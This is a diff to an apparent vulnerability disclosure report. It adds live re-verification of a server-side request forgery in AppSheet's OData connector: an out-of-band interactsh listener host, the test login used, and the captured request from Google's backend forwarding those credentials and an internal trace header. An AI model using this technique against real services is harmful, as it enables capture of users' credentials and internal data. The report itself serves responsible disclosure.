@@ -76,6 +76,22 @@ grep -E "(DNS|HTTP) interaction" /tmp/oob.log
 
 ## EVIDENCE ALREADY CAPTURED
 
+### 0. Live re-verification — independent reproduction (2026-06-16 11:43 UTC)
+
+Reproduced from scratch on a clean `interactsh` listener
+(`d8ojc9269r86mkep7ev0w7czbi1ekqwc8.oast.site`), free AppSheet account, OData form
+Username `Tester ` / Password `Tester1234`, single **Test** click:
+
+```http
+GET /$metadata HTTP/1.1                       ← from 35.247.115.29 (GCP)
+Authorization: Basic VGVzdGVyIDpUZXN0ZXIxMjM0  ← base64 "Tester :Tester1234" (creds verbatim)
+Traceparent: 00-1a14b417be862518f5c02dc9367ae9ed-b03449d2b460c160-00
+```
+DNS from `192.178.118.92/93/86` (Google, AS15169). Error in UI reflected the response
+content type (`text/html; charset=utf-8`). Confirms: server-side fetch from GCP, credential
+forwarding, internal trace-header leak, and response reflection — all reproduced ~24h after
+the original capture, from a different GCP fleet IP.
+
 ### 1. Full server-side HTTP request received from the GCP backend
 
 Test payload `https://<OOB_URL>` with Username `testuser` / Password `testpass1234`.
